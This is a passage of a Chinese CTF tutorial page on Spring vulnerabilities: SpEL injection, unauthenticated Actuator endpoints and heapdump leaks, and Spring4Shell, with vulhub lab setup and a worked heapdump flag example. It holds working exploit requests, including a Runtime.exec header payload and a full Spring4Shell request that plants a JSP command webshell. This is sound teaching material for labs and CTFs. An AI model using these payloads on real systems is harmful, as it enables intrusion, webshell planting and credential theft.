+<p>绕过滤的思路也和 SSTI 相通：如果题目过滤了 <code>Runtime</code>、<code>T(</code> 等关键字，可以尝试字符串拼接（<code>T(java.lang.Ru'+'ntime)</code>）、反射调用 <code>Class.forName</code>、利用 <code>getClass().forName(...)</code> 等方式变形。核心原则不变：<strong>找到一个能调用任意类方法的表达式，再把结果转成字符串带出来</strong>。</p>
+<h3 id="_1">注入点在哪里<a class="headerlink" href="#_1" title="Permanent link">¶</a></h3>
+<p>除了上面这种故意写出的解析器，历史上真实组件的 SpEL 注入点很多，CTF 常考的有：</p>
+<ul>
+<li><strong>Spring Data REST</strong> 的 PATCH 请求（CVE-2017-8046）；</li>
+<li><strong>Spring Cloud Function</strong> 的 <code>spring.cloud.function.routing-expression</code> 请求头（CVE-2022-22963）——这个在 CTF 里出镜率很高，payload 形如：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nf">POST</span> <span class="nn">/functionRouter</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">target:8080</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="na">spring.cloud.function.routing-expression</span><span class="o">:</span> <span class="l">T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")</span>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="na">Content-Length</span><span class="o">:</span> <span class="l">5</span>
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="err">hello</span>
+</code></pre></div>
+<h2 id="actuator">Actuator 未授权访问<a class="headerlink" href="#actuator" title="Permanent link">¶</a></h2>
+<h3 id="actuator_1">Actuator 是什么<a class="headerlink" href="#actuator_1" title="Permanent link">¶</a></h3>
+<p>Spring Boot Actuator 是内置的「监控套件」，为运维提供一批 HTTP 端点来查看应用状态。问题出在：<strong>很多开发者把它直接暴露在公网，且没有鉴权</strong>。这在 CTF 里基本等于送分。</p>
+<p>在 Spring Boot 1.x 中端点挂在根路径下（<code>/env</code>、<code>/heapdump</code>），2.x 之后统一挂在 <code>/actuator/</code> 下（<code>/actuator/env</code>），做题时两个都要试。</p>
+<p>先访问 <code>/actuator</code> 看看暴露了哪些端点：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>curl<span class="w"> </span>http://target:8080/actuator
+</code></pre></div>
+<p>返回的 JSON 里 <code>_links</code> 会列出所有可用端点，常见的利用价值如下。</p>
+<h3 id="env-configprops">/env 与 /configprops：读配置<a class="headerlink" href="#env-configprops" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>curl<span class="w"> </span>http://target:8080/actuator/env<span class="w"> </span><span class="p">|</span><span class="w"> </span>jq<span class="w"> </span>.
+</code></pre></div>
+<p><code>/env</code> 会返回应用的全部环境变量和配置项。老版本（Spring Boot 1.x）是 <strong>明文</strong> 的，数据库密码、云厂商的 <code>accessKey</code>、<code>secret</code>、JWT 密钥经常直接躺在里面；2.x 之后敏感值默认打码成 <code>******</code>，但打码规则不完整，换 <code>org.springframework.boot.actuate</code> 之外的路径或用 <code>/configprops</code> 有时能看到原文。</p>
+<h3 id="heapdump">/heapdump：内存转储，信息泄露重灾区<a class="headerlink" href="#heapdump" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>curl<span class="w"> </span>-o<span class="w"> </span>heapdump<span class="w"> </span>http://target:8080/actuator/heapdump
+</code></pre></div>
+<p><code>/heapdump</code> 会下载一个 JVM 堆快照（HPROF 文件，通常几十 MB 起）。应用运行期间出现过的明文数据——请求头里的 Cookie、Authorization、刚提交的密码、配置里的密钥——都可能还在内存里没来得及释放。</p>
+<p>CTF 场景下不需要上 MAT 这种重型工具，直接 <code>strings</code> 加 grep 往往就够：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>strings<span class="w"> </span>heapdump<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-iE<span class="w"> </span><span class="s1">'flag|password|secret|Authorization'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-u
+</code></pre></div>
+<p>也可以用开源工具 <code>JDumpSpider</code> 自动提取 heapdump 里的各类敏感信息（数据源、Redis、Cookie 等）。</p>
+<h3 id="refresh-env-post-rce">/refresh 与 /env POST：从读配置到 RCE<a class="headerlink" href="#refresh-env-post-rce" title="Permanent link">¶</a></h3>
+<p>如果 <code>/actuator/env</code> 支持 POST，配合 <code>/actuator/refresh</code> 重载配置，就可以远程修改应用属性。经典利用链有两条：</p>
+<ul>
+<li><strong>eureka.client.serviceUrl.defaultZone</strong> 指向恶意 Eureka Server，配合 xstream 反序列化打 RCE；</li>
+<li><strong>spring.datasource.url / spring.cloud.config.uri</strong> 等属性改成恶意地址，配合 <code>/refresh</code> 让应用去连攻击者的服务。</li>
+</ul>
+<p>在 CTF 里更多是简化版本：POST 修改某个属性后直接读 flag，或改 <code>spring.main.sources</code> 之类。记住「<strong>改属性 → POST /refresh 生效</strong>」这个两步套路即可。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://target:8080/actuator/env<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="w">  </span>-H<span class="w"> </span><span class="s1">'Content-Type: application/json'</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="w">  </span>-d<span class="w"> </span><span class="s1">'{"name":"some.property","value":"evil"}'</span>
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://target:8080/actuator/refresh
+</code></pre></div>
+<h2 id="spring4shellcve-2022-22965">Spring4Shell（CVE-2022-22965）<a class="headerlink" href="#spring4shellcve-2022-22965" title="Permanent link">¶</a></h2>
+<h3 id="_2">原理：一次「参数绑定」引发的写入<a class="headerlink" href="#_2" title="Permanent link">¶</a></h3>
+<p>先补一个前置知识：Spring MVC 的参数绑定机制。当 Controller 接收一个对象参数时，请求里的 <code>a.b.c=value</code> 形式的参数会被框架自动沿着 getter 链一路赋值下去。比如传 <code>user.address.city=Beijing</code>，框架就会调用 <code>user.getAddress().setCity("Beijing")</code>。</p>
+<p>问题在于：每个 Java 对象都有 <code>getClass()</code>，而 <code>Class</code> 又能拿到 <code>classLoader</code>。于是攻击者可以构造参数沿着这条链走：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>class.module.classLoader.resources.context.parent.pipeline.first.xxx
+</code></pre></div>
+<p>最终摸到 Tomcat 的日志阀门 <code>AccessLogValve</code>，把它的配置改掉——<strong>日志文件名改成 <code>.jsp</code>，日志内容（pattern）写入一句话木马，日志目录指向 webapp 根目录</strong>。下一次 Tomcat 记访问日志时，就把 webshell 写进了网站目录里。整个过程不需要上传文件，纯靠 HTTP 参数绑定完成任意文件写入，这也是它被戏称为 "Spring4Shell"、与 Log4Shell 齐名的原因。</p>
+<p>漏洞触发条件比较苛刻（这也是为什么 CTF 环境都是精心配置的）：</p>
+<ul>
+<li>JDK 9+（因为 JDK 9 引入的 <code>module</code> 绕过了旧补丁对 <code>class.classLoader</code> 的拦截）；</li>
+<li>Spring 以 <strong>war 包部署在外置 Tomcat</strong> 上（Spring Boot 默认的内嵌 Tomcat + jar 部署不受影响，因为没有可写的 webapp 目录）。</li>
+</ul>
+<h3 id="jsp-webshell">利用：写入 JSP Webshell<a class="headerlink" href="#jsp-webshell" title="Permanent link">¶</a></h3>
+<p>标准利用就是一连串参数绑定，把 Tomcat 访问日志改造成 JSP 马。一个典型请求（对 vulhub 的靶场）：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="nf">POST</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="na">Host</span><span class="o">:</span> <span class="l">target:8080</span>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="nt">class.module.classLoader.resources.context.parent.pipeline.first.pattern</span><span class="o">=</span><span class="s">%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di</span><span class="p">&amp;</span><span class="nt">class.module.classLoader.resources.context.parent.pipeline.first.suffix</span><span class="o">=</span><span class="s">.jsp</span><span class="p">&amp;</span><span class="nt">class.module.classLoader.resources.context.parent.pipeline.first.directory</span><span class="o">=</span><span class="s">webapps/ROOT</span><span class="p">&amp;</span><span class="nt">class.module.classLoader.resources.context.parent.pipeline.first.prefix</span><span class="o">=</span><span class="s">tomcatwar</span><span class="p">&amp;</span><span class="nt">class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat</span><span class="o">=</span>
+</code></pre></div>
+<p>参数的含义对应 AccessLogValve 的属性：</p>
+<ul>
+<li><code>pattern</code> —— 日志每行写的内容，这里塞了一段 JSP 命令执行马（URL 编码后）；</li>
+<li><code>suffix</code> —— 日志文件后缀，改成 <code>.jsp</code>；</li>
+<li><code>directory</code> —— 日志目录，指向 <code>webapps/ROOT</code>；</li>
+<li><code>prefix</code> / <code>fileDateFormat</code> —— 拼出固定的文件名 <code>tomcatwar.jsp</code>（清空日期后缀防止文件名带时间戳）。</li>
+</ul>
+<p>发完请求后等 Tomcat 落盘日志，webshell 就在 <code>/tomcatwar.jsp</code>，用法：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>curl<span class="w"> </span><span class="s1">'http://target:8080/tomcatwar.jsp?pwd=j&amp;cmd=cat%20/flag'</span>
+</code></pre></div>
+<p>实际做题时建议直接用公开 EXP 脚本，不用手撸这串编码。</p>
+<h2 id="vulhub">本地复现：vulhub 一键起环境<a class="headerlink" href="#vulhub" title="Permanent link">¶</a></h2>
+<p>以上所有漏洞在 <a href="https://github.com/vulhub/vulhub">vulhub</a> 里都有现成环境，推荐本地复现一遍再做题。前提是你已经装好 Docker（参考「Docker与漏洞环境」一章）：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/vulhub/vulhub.git
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="nb">cd</span><span class="w"> </span>vulhub/spring/CVE-2022-22965
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>docker<span class="w"> </span>compose<span class="w"> </span>up<span class="w"> </span>-d
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="c1"># 等待构建完成，访问 http://127.0.0.1:8080</span>
+<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>docker<span class="w"> </span>compose<span class="w"> </span>down<span class="w">   </span><span class="c1"># 打完记得关掉环境</span>
+</code></pre></div>
+<p>本章对应的目录：</p>
+<ul>
+<li><code>vulhub/spring/CVE-2022-22963</code> —— Spring Cloud Function SpEL 注入；</li>
+<li><code>vulhub/spring/CVE-2022-22965</code> —— Spring4Shell；</li>
+<li><code>vulhub/spring/CVE-2017-8046</code> —— Spring Data REST SpEL 注入；</li>
+<li><code>vulhub/spring/CVE-2018-1273</code> —— Spring Data Commons 绑定注入。</li>
+</ul>
+<p>Actuator 泄露的靶场没有官方 vulhub 条目，但 NSSCTF、CTFHub 等平台上大量题目都是这一类，识别特征也很明显（<code>/actuator</code> 可访问），直接线上练即可。</p>
+<h2 id="ctf-actuator-heapdump-flag">CTF 例题：Actuator heapdump 拿 flag<a class="headerlink" href="#ctf-actuator-heapdump-flag" title="Permanent link">¶</a></h2>
+<blockquote>
+<p>题目类型：Spring Boot Actuator 未授权访问，经典送分流程。</p>
+</blockquote>
+<p><strong>1. 信息收集。</strong> 打开题目是一个简单的登录页。扫目录（工具用法见「Web入门题单」一章）发现 <code>/actuator</code> 可访问：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>curl<span class="w"> </span>http://challenge.example.com:8080/actuator
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="p">{</span>
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="w">  </span><span class="nt">"_links"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="w">    </span><span class="nt">"self"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">"href"</span><span class="p">:</span><span class="w"> </span><span class="s2">"http://challenge.example.com:8080/actuator"</span><span class="p">},</span>
+<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="w">    </span><span class="nt">"heapdump"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">"href"</span><span class="p">:</span><span class="w"> </span><span class="s2">"http://challenge.example.com:8080/actuator/heapdump"</span><span class="p">},</span>
+<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="w">    </span><span class="nt">"env"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">"href"</span><span class="p">:</span><span class="w"> </span><span class="s2">"http://challenge.example.com:8080/actuator/env"</span><span class="p">}</span>
+<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="w">  </span><span class="p">}</span>
+<a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a><span class="p">}</span>
+</code></pre></div>
+<p><strong>2. 先翻 /env。</strong> 访问 <code>/actuator/env</code>，快速浏览 JSON，没有发现明文的密码或 flag（2.x 打码了），但有 heapdump 端点——继续。</p>
+<p><strong>3. 下载 heapdump 并检索。</strong> 既然是登录页，用户刚提交过的密码很可能还在 JVM 堆内存里，而题目大概率就是「admin 密码即 flag」或「登录后拿 flag」：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>curl<span class="w"> </span>-o<span class="w"> </span>heapdump<span class="w"> </span>http://challenge.example.com:8080/actuator/heapdump
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>strings<span class="w"> </span>heapdump<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-iE<span class="w"> </span><span class="s1">'flag\{|password'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-u
+</code></pre></div>
+<p>输出里出现：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>{"username":"admin","password":"flag{heapdump_1eak_is_dangerous}"}
+</code></pre></div>
+<p><strong>4. 收尾。</strong> 拿到的字符串正是 flag；如果密码不是 flag，就用它登录后台，在后台页面拿 flag。</p>
+<p><strong>复盘要点：</strong></p>
+<ul>
+<li>Actuator 题的核心套路是「<strong>枚举端点 → /env 读配置 → /heapdump 翻内存</strong>」，三步走能解决九成同类题；</li>
+<li>heapdump 检索的关键是猜关键字：<code>flag</code>、<code>password</code>、<code>secret</code>、登录接口的参数名；</li>
+<li>这类漏洞属于「敏感信息泄露」的 Java 版，和「敏感信息泄露」一章里 <code>.git</code>、<code>.DS_Store</code> 泄露的思路一脉相承——服务器把你没料到的东西直接递到了你手上。</li>
+</ul>
+<h2 id="_3">小结<a class="headerlink" href="#_3" title="Permanent link">¶</a></h2>
+<ul>
+<li><strong>SpEL 注入</strong>：<code>T(java.lang.Runtime).getRuntime().exec()</code>，思路对标 SSTI，重点记 Spring Cloud Function 的请求头注入；</li>
+<li><strong>Actuator</strong>：<code>/actuator</code> 枚举端点，<code>/env</code> 读配置，<code>/heapdump</code> 用 strings+grep 翻内存，<code>/refresh</code> 配 POST /env 改属性；</li>
+<li><strong>Spring4Shell</strong>：参数绑定链 <code>class.module.classLoader...</code> 改 Tomcat 日志配置写 JSP 马，条件苛刻（JDK9+、war 部署），CTF 里照抄 EXP 即可。</li>
+</ul>
+<p>遇到 Java Web 题不要慌——先找 Whitelabel 报错和 <code>/actuator</code>，再看输入点能不能打 SpEL，多数题就这两个方向。</p></div>
+
+<!-- Source file information -->
+
+
+<!-- Was this page helpful? -->
+
+  
+
+
+
+
+<!-- Previous and next pages link -->
+<nav
+class="md-footer__inner md-grid"
+aria-label="页脚"
+
+>
+
+<!-- Link to previous page -->
+
+  
+  <a
+    href="../java_unser/"
+    class="md-footer__link md-footer__link--prev"
+    aria-label="上一页: Java反序列化"
+    rel="prev"
+  >
+    <div class="md-footer__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+    </div>
+    <div class="md-footer__title">
+      <span class="md-footer__direction">
+        上一页
+      </span>
+      <div class="md-ellipsis">
+        Java反序列化
+      </div>
+    </div>
+  </a>
+
+
+<!-- Link to next page -->
+
+  
+  <a
+    href="../java_audit/"
+    class="md-footer__link md-footer__link--next"
+    aria-label="下一页: Java代码审计"
+    rel="next"
+  >
+    <div class="md-footer__title">
+      <span class="md-footer__direction">
+        下一页
+      </span>
+      <div class="md-ellipsis">
+        Java代码审计
+      </div>
+    </div>
+    <div class="md-footer__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+    </div>
+  </a>
+
+</nav>
+
+<!-- Comment system -->
+
+  <h2 id="__comments">评论</h2>
+
+  <!-- giscus：主题与外壳 hc-theme 同步（初始 + 切换时 postMessage） -->
+  <script src="https://giscus.app/client.js"
+    data-repo="ProbiusOfficial/Hello-CTF"
+    data-repo-id="R_kgDOJXX6hg"
+    data-category="Show and tell"
+    data-category-id="DIC_kwDOJXX6hs4CXmuV"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="top"
+    data-theme="light"
+    data-lang="zh-CN"
+    crossorigin="anonymous"
+    async>
+  </script>
+  <script>
+    (function () {
+      var script = document.querySelector("script[src*=giscus]");
+      function currentTheme() {
+        var t = null;
+        try { t = localStorage.getItem("hc-theme"); } catch (e) {}
+        return t === "dark" ? "dark" : "light";
+      }
+      /* 初始主题：giscus 加载前写入 data-theme */
+      script.setAttribute("data-theme", currentTheme());
+      /* 外壳主题切换 → 通知 giscus iframe 换肤（由 shell.js 广播 hc-theme-change） */
+      document.addEventListener("hc-theme-change", function (e) {
+        var theme = e.detail === "dark" ? "dark" : "light";
+        var iframe = document.querySelector("iframe.giscus-frame");
+        if (iframe) {
+          iframe.contentWindow.postMessage(
+            { giscus: { setConfig: { theme: theme } } },
+            "https://giscus.app"
+          );
+        }
+      });
+    })();
+  </script>
+
+  <!-- 评论区显示优化 -->
+  <style>
+    #__comments {
+      margin-top: 2.2rem;
+      padding-top: 1.2rem;
+      border-top: 1px solid var(--line, #e6eaf1);
+      font-size: 1rem;
+    }
+    .giscus, .giscus-frame { width: 100%; }
+    .giscus-frame { border: none; color-scheme: light; }
+    [data-md-color-scheme="slate"] .giscus-frame { color-scheme: dark; }
+  </style>
+
+
+<!-- 才懒得给你加空格呢 给你塞个 Pangu.js 哼！ -->
+<head>
+  <script src="https://cdn.jsdelivr.net/npm/pangu.simple@1.0.5/dist/browser/pangu.js"></script>
+  <script>
+    pangu.spacingPage();
+  </script>
+</head>
+      </article>
+      
+        <aside class="hc-toc">
+          <div class="hc-toc-cap">ON THIS PAGE</div>
+          
+  <ul>
+    
+      <li>
+        <a href="#spring">Spring漏洞</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#spring_1">Spring 生态极简介绍</a>
+        
+      </li>
+    
+      <li>
+        <a href="#spel">SpEL 表达式注入</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#spel_1">什么是 SpEL</a>
+        
+      </li>
+    
+      <li>
+        <a href="#payload">Payload 构造</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_1">注入点在哪里</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#actuator">Actuator 未授权访问</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#actuator_1">Actuator 是什么</a>
+        
+      </li>
+    
+      <li>
+        <a href="#env-configprops">/env 与 /configprops：读配置</a>
+        
+      </li>
+    
+      <li>
+        <a href="#heapdump">/heapdump：内存转储，信息泄露重灾区</a>
+        
+      </li>
+    
+      <li>
+        <a href="#refresh-env-post-rce">/refresh 与 /env POST：从读配置到 RCE</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#spring4shellcve-2022-22965">Spring4Shell（CVE-2022-22965）</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_2">原理：一次「参数绑定」引发的写入</a>
+        
+      </li>
+    
+      <li>
+        <a href="#jsp-webshell">利用：写入 JSP Webshell</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#vulhub">本地复现：vulhub 一键起环境</a>
+        
+      </li>
+    
+      <li>
+        <a href="#ctf-actuator-heapdump-flag">CTF 例题：Actuator heapdump 拿 flag</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_3">小结</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+  </ul>
+
+        </aside>
+      
+    </div>
+    <footer class="hc-footer">
+      <span>© 2026 探姬 · Hello CTF</span>
+      <span class="links">
+        <a href="https://github.com/ProbiusOfficial/Hello-CTF" target="_blank" rel="noopener">GitHub</a>
+        <a href="https://github.com/ProbiusOfficial/Hello-CTF/pulls" target="_blank" rel="noopener">参与共建</a>
+        <a href="../../sidebar/feedback.html">反馈与群聊</a>
+      </span>
+    </footer>
+  </div>
+
+  <!-- 站点原有 extra_javascript（baidu_SEO / katex / statis / FullCalendar 等） -->
+  
+    <script src="../../javascripts/baidu_SEO.js"></script>
+  
+    <script src="../../javascripts/katex.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/contrib/auto-render.min.js"></script>
+  
+    <script src="../../javascripts/statis.js"></script>
+  
+    <script src="../../javascripts/FullCalendar.js"></script>
+  
+    <script src="../../shell/feedback-widget.js"></script>
+  
+
+  <!-- mermaid（material bundle 移除后自行加载） -->
+  <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      if (!window.mermaid) return;
+      document.querySelectorAll("pre.mermaid").forEach(function (el) {
+        var div = document.createElement("div");
+        div.className = "mermaid";
+        div.textContent = el.textContent;
+        el.replaceWith(div);
+      });
+      try {
+        mermaid.initialize({ startOnLoad: false, theme: "neutral" });
+        mermaid.run({ querySelector: ".mermaid" });
+      } catch (e) {}
+    });
+  </script>
+
+  <!-- 代码复制按钮（material bundle 移除后自实现） -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      document.querySelectorAll(".md-typeset pre").forEach(function (pre) {
+        if (pre.querySelector(".hc-copy") || pre.classList.contains("mermaid")) return;
+        var btn = document.createElement("button");
+        btn.className = "hc-copy";
+        btn.textContent = "复制";
+        btn.onclick = function () {
+          var text = pre.innerText.replace(/^复制\n/, "");
+          navigator.clipboard.writeText(text).then(function () {
+            btn.textContent = "已复制";
+            setTimeout(function () { btn.textContent = "复制"; }, 1500);
+          });
+        };
+        pre.appendChild(btn);
+      });
+    });
+  </script>
+
+  <!-- TOC 滚动高亮 -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      var links = Array.from(document.querySelectorAll(".hc-toc a"));
+      if (!links.length) return;
+      var map = links.map(function (a) {
+        var el = document.getElementById(decodeURIComponent(a.getAttribute("href").slice(1)));
+        return el ? { a: a, el: el } : null;
+      }).filter(Boolean);
+      function spy() {
+        var current = null;
+        map.forEach(function (m) { if (m.el.getBoundingClientRect().top <= 80) current = m; });
+        links.forEach(function (a) { a.classList.remove("on"); });
+        if (current) current.a.classList.add("on");
+      }
+      document.addEventListener("scroll", spy, { passive: true });
+      spy();
+    });
+  </script>
+
+  <!-- 顶部导航下拉：fixed 定位避开 overflow 裁剪 -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      document.querySelectorAll(".tn-item").forEach(function (item) {
+        var drop = item.querySelector(".tn-drop");
+        if (!drop) return;
+        item.addEventListener("mouseenter", function () {
+          var r = item.getBoundingClientRect();
+          drop.style.top = r.bottom + "px";
+          var left = Math.min(r.left, window.innerWidth - 240);
+          drop.style.left = Math.max(10, left) + "px";
+        });
+      });
+    });
+  </script>
+
+  
+</body>
+</html>
